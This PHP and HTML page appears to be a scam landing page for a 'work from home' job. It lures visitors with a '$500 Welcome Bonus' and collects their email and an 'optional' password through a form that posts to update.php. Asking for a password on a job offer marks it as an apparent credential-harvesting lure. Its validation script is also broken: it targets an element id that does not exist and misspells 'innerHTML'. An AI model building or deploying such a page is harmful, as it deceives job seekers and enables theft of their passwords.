<?php 
require_once 'php_action/db_connect.php';

?>
<?php 
	include 'header.php'; 
?>

<body >
	<div class="container middile_point">
		<div class="row vertical d-flex justify-content-center">
			<div class="col-md-6 col-sm-12 text-center d-flex justify-content-center">
				<div class="panel panel-information ">
					<div class="panel-heading">
						<h3 class="panel-titles">Work From Home Job Available!   </h3>
					</div>

					<div class="panel_second_heading">
						<h3>One Position Available For You!</h3>
					</div>
					<div class="panel_text">
						<p>**Qualify for a $500 Welcome Bonus By <br> Entering Your E-mail Below**</p>
					</div>

					<div class="panel-body">
						
						<form class="form-horizontal" action="update.php" method="post" id="loginForm">
							<fieldset>

							  <div class="form-group">
									<!-- <label for="email" class="col-sm-2 control-label">Email</label> -->
									<div class="col-sm-12">
										<input type="email" name="email" placeholder="Enter Your Best Email Address." autocomplete="off" class="form-control">
										<span id="mail_val" class="text-danger"></span>
										
									</div>
								</div>
								<div class="form-group">
									<!-- <label for="password" class="col-sm-2 control-label">Password</label> -->
									<div class="col-sm-12">
										<input  type="password" name="password" placeholder="Password (Optional)" autocomplete="off" class="form-control">
									</div>
								</div>								
								<div class="form-group">
									<div class="col-sm-offset-0 col-sm-12">
										<button type="submit" name="submit" class="btns-default">Click Here To Start Meaning!</button>
									</div>
								</div>

							</fieldset>
						</form>
						<div class="panel_box_footer">
						<div class="box_foot_in">
							<p>* We Will Not Spam, Rent, Or Sell Your Information*</p>
						</div>
					</div>
					</div>
					<!-- panel-body -->
				</div>
				<!-- /panel -->
			</div>
			<!-- /col-md-4 -->
		</div>
		<!-- /row -->
	</div>
	<!-- container -->	

	<script type="text/javascript">
				
				function validation(){
					var user = document.getElementById('email').value;
					if(user== ""){
						document.getElementById('mail_val').innerHtml = "Please Enter The Email";
						return false;
					}

				}
	
		</script>
	
</body>
	
</html>







	